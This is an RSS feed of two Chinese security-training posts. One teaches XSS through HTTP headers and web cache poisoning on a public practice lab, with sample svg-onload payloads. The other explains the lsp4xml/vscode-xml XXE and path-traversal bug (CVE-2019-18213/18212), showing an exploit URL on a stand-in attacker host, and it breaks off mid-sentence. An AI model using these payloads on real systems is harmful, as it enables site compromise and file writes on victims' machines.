<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>二向箔安全学院</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
<description>前沿、专业的网络空间攻防实训 专注于提供最前沿的网络空间安全攻防人才培养的解决方案。twosecurity.cn</description>
<language>zh-cn</language>
<lastBuildDate>Sat, 18 Jan 2020 22:23:04 +0800</lastBuildDate>
<item>
<title>在HTTP头中进行XSS</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-17-103224416.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103224416&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8d9bc030ff73aa70931523b798ba619d_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;说到 XSS 相信大家肯定都不陌生（都 2020 年了，还在讲 XSS 这种老掉牙的东西），有些人甚至看到输入框就想往里面输 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; ，今天我们就来学习 &lt;b&gt;怎样在 HTTP 头中进行 XSS ？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;直奔主题，先几个 XSS 的经典案例：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&amp;lt;form action=&amp;#34;/xss.php/&amp;#34;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&lt;/li&gt;&lt;li&gt;&amp;lt;p&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;/p&amp;gt;&lt;/li&gt;&lt;li&gt;&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;a&amp;#34; value=&amp;#34;&amp;#34;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;#34;&amp;gt;&lt;/li&gt;&lt;li&gt;&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;a&amp;#34; value=&amp;#34;&amp;#34;&amp;amp;gt;&amp;gt;&amp;lt;svg onload=alert(1)&amp;amp;gt;&amp;#34;&amp;gt;&lt;/li&gt;&lt;li&gt;var test = &amp;#39;&amp;lt;/script&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;#39;;&lt;/li&gt;&lt;li&gt;...&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;当然，远不止这些，枚不胜举。&lt;/p&gt;&lt;p&gt;其他关于 XSS 的知识就不多讲了，毕竟是老生常谈的东西，下面就来讲讲不一般的 XSS。&lt;/p&gt;&lt;h2&gt;HTTP头中的XSS&lt;/h2&gt;&lt;p&gt;开门见山，在某些情况下，没有清除应用程序 HTTP 头中传递的信息，并将其输出到请求页面的某个位置时，导致的 XSS 情况。&lt;/p&gt;&lt;p&gt;&lt;b&gt;一种情况&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我们可以控制 HTTP 头中的某些信息存储在数据库中，然后在同一页面中，应用程序中的其他任何地方甚至在另一个不可访问的系统中检索到。但是，由于 CDN 和 WAF 的存在，还存在另一种非常普遍的情况，无需进行数据库操作即可持续进行攻击：&lt;b&gt;Web 缓存中毒&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;实践&lt;/h2&gt;&lt;p&gt;练习地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//brutelogic.com.br/lab/header.php&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;brutelogic.com.br/lab/h&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;eader.php&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;288&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1244&quot; data-original=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;288&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1244&quot; data-original=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-b82c6540b599044e291e72c7c2444afd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?=json_encode(getallheaders()).&amp;#34;\n&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在命令行中执行命令 curl -i，它向我们显示了响应的 HTTP 标头以及 JSON 格式的请求头。&lt;/p&gt;&lt;blockquote&gt;curl 是一种命令行工具，作用是发出网络请求，然后获取数据，显示在&amp;#34;标准输出&amp;#34;（stdout）上面，它支持多种协议。&lt;br/&gt;-i 参数可以显示 http response 的头信息，连同网页代码一起。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;808&quot; data-original=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;808&quot; data-original=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-aa4061a3796868454a93481d64b48d70_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;由于实验靶场的 WAF 提供了最后一个标头 x-sucuri-cache，因此我们需要在 URL 中添加一些内容来避免缓存，该标头的值为 HIT，意思就是它来着 WAF 的缓存。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;808&quot; data-original=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;808&quot; data-rawheight=&quot;291&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;808&quot; data-original=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d7011e7d8adf9b7b17fb300869ff47b3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;因此，访问带参数“lololol”的页面，我们能够得到页面的非缓存版本，标头 x-sucuri-cache 的标头值变成了 MISS 。再注入自己的标头（使用参数 -H），以检查它是否以响应的形式出现。&lt;/p&gt;&lt;blockquote&gt;-H --header 在 http request 之中，自行增加一个头信息。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;309&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;309&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-1f28a0d1e5b6e0ed7b968e4bbfb7eb6f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;响应成功，得到带有 Test：myValue 的响应。再更改字符串为“kkkkk”发出另一个请求，不然将返回带有“ lololol”字符串的缓存响应。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-46012439231177073cd5f04820655462_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;再使用“kkkkk”作为字符串来再次开始缓存处理。如上图所示，还带入了 XSS payload。但仅是对自己有用，因为只是本机终端发送该标头。payload 不会出现在其他的浏览器请求中。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-0ddadd5204c80daf1cff10ac5ff91927_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;发另一个请求（注意看 data 时间不同），貌似没有什么区别。这是因为缓存机制是基于 MISS-MISS-HIT，因此下一个为 MISS。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;826&quot; data-rawheight=&quot;327&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;826&quot; data-original=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-97afb366e58be6e82485e0935e7a9c62_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;验证是否已经缓存，打开目标 URL&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;https://brutelogic.com.br/lab/header.php?kkkkk&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;912&quot; data-rawheight=&quot;273&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;912&quot; data-original=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;912&quot; data-rawheight=&quot;273&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;912&quot; data-original=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c361c13cc53344e2a2337ea340161de1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;该 URL 将保持中毒状态，直到缓存过期，这就是缓存投毒。&lt;/p&gt;&lt;p&gt;练习地址2：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//brutelogic.com.br/lab/welcome.php&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;brutelogic.com.br/lab/w&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;elcome.php&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;工作原理跟上面一样，不过没有了那么明显的输出点，执行 XSS 需要先找到输出点。页面的源代码如下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;?php
$name = $_COOKIE[&amp;#34;name&amp;#34;];
if($name){
    echo &amp;#34;&amp;lt;p&amp;gt;Welcome, $name!&amp;lt;/p&amp;gt;\n&amp;#34;;
}else{
    echo &amp;#34;&amp;lt;p&amp;gt;Welcome, guest!&amp;lt;/p&amp;gt;\n&amp;#34;;
}
?&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;尝试进行 XSS 吧，完成的同学，评论区欢迎:)&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;来源：&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//brutelogic.com.br/blog/xss-via-http-headers/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;brutelogic.com.br/blog/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;xss-via-http-headers/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-17-103224416</guid>
<pubDate>Fri, 17 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>别以为VSCode很安全🧐</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-17-103044773.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103044773&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-96a8fd622af532186aaf65a15caa3bb6_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;2019 年中，XXE 漏洞“横行”，相比以往而言，XXE 漏洞额外的多。例如：通过 OpenCMS 利用 Apache Solr&lt;/p&gt;&lt;p&gt;&lt;b&gt;LSP4XML（XML 语言服务器）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;是一个XML语言具体实现语言服务器协议，可与任何编辑器使用支持该协议，以提供良好的支持XML语言。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/angelozerr/lsp4xml&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/angelozerr/l&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;sp4xml&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;用于解析 VSCode-XML 中的 XML 文件，Eclipse 的 wildwebdeveloper，theia-xml等的库。受到 XXE（CVE-2019-18213）的影响，通过打开恶意 XML 文件可导致 RCE（CVE-2019-18212）被利用。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;CVE-2019-18213：XXE &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18213&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18213&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;适用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml）中使用的 0.9.1 之前的 XML 语言服务器（aka lsp4xml）允许通过精心制作的 XML 文档进行 XXE，并生成 SSRF 及 SMB 连接启动等。存在于extensions / contentmodel / participants / diagnostics / LSPXMLParserConfiguration.java 中。&lt;br/&gt;CVE-2019-18212：目录遍历 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18212&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18212&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;0.9.1 之前的 XML 语言服务器（aka lsp4xml）中的 XMLLanguageService.java（用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml））允许远程攻击者通过目录遍历写入任意文件。&lt;/blockquote&gt;&lt;h2&gt;XXE 奇遇&lt;/h2&gt;&lt;p&gt;拿一个标准的 XXE payload，并带有指向我们监听网络服务器的外部 DTD，目标服务器无法执行对互联网的 HTTP 请求，所以按道理只会存在一个 DNS 的交互过程，但是随后收到了两个不同的 DNS 交互和一个 HTTP 请求，这是为什么？&lt;/p&gt;&lt;h2&gt;探究&lt;/h2&gt;&lt;p&gt;在我尝试找出交互的原因时，发现 HTTP 请求来自我自己的 IP 地址，这就奇怪了。&lt;/p&gt;&lt;p&gt;为了一探究竟，当我在 VS Code 中保存新的 XML payload 时，使用新的 Burp Collaborator 实例作为回调服务器重播所有操作步骤，并触发了 XXE。不过，可能和 VS Code 并没有任何关系。。。&lt;/p&gt;&lt;p&gt;所有，先检查了一遍 VS Code 的配置和插件等，然后发现安装了一个名为 XML 的插件，由 RedHat 发布的。（应该是 VS Code 推荐安装的）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;XML 该拓展插件的作用是提供了对创建和编辑 XML 文档的支持，它基于使用 Java 运行的 LSP4XML 语言服务器。&lt;/blockquote&gt;&lt;p&gt;第一想到的就是禁用它，然后再进行后面的实验步骤。&lt;/p&gt;&lt;p&gt;VSCode-XML 使你可以打开 XML / DTD / XSTL / XSD 文件并解析它们的语法错误，重点是根据 DTD / XSD 定义验证 XML / XSTL 文件。&lt;/p&gt;&lt;p&gt;可知 XXE 漏洞本身在于 LSP4XML：在安装了 VSCode-XML 的 VS Code 中打开 XML 文件编辑或保存时，LSP4XML 在本地解析文件并在 VS Code 界面中报错。&lt;/p&gt;&lt;p&gt;&lt;b&gt;以此构造一个恶意文件，当安装了 VSCode-XML 的 VS Code 的目标打开该 XML 文件时，实现一系列利用操作。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;尝试了在这种情况下使用的常见渗透方法，但是由于最近的 Java 版本（1.8+）和 URL 解析的结合，所有操作都失败了。&lt;/p&gt;&lt;p&gt;可以执行的只有：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;盲 SSRF&lt;/li&gt;&lt;li&gt;Windows 上的 NetNTLMv2 渗透&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;实验&lt;/h2&gt;&lt;p&gt;在玩 XXE 时，发现一种奇怪的的行为：url 仅搜索一次，再次进行操作就不会去搜索。应该是存在某种缓存机制，将 DTD 的文件下载并存储在某个地方。&lt;/p&gt;&lt;p&gt;&lt;b&gt;缓存机制：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;解析 XML 文件&lt;/li&gt;&lt;li&gt;如果引用了外部实体，则注明其 URL&lt;/li&gt;&lt;li&gt;通过检查目录 $HOME/.lsp4xml/cache/http/$host/$path_of_file，使用指定的 URL 验证来自同一主机的文件是否已被缓存&lt;/li&gt;&lt;li&gt;如果缓存条目不存在，则文件被下载并移至$HOME/.lsp4xml/cache/http/$host/$path_of_file&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;那么问题来了，路径能不能被控制？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果外部实体 URL 路径中包含 ../ 会发生什么？&lt;/p&gt;&lt;p&gt;经实验，缓存过程在保存缓存文件时会受到路径遍历的影响，从而可以在任意本地目录中写入任意远程文件。如果尚未创建所需的文件夹结构，此过程也能实现。&lt;/p&gt;&lt;h2&gt;从 XXE 到 RCE&lt;/h2&gt;&lt;p&gt;漏洞存在的原因是在缓存的最后一步，如果缓存条目不存在，则文件被下载并移至对应的目录，其中参数 $path_of_file 可被控制，比如外部实体的 URL 为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http://attack.er/../../../../Desktop/test.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;缓存文件将被写入 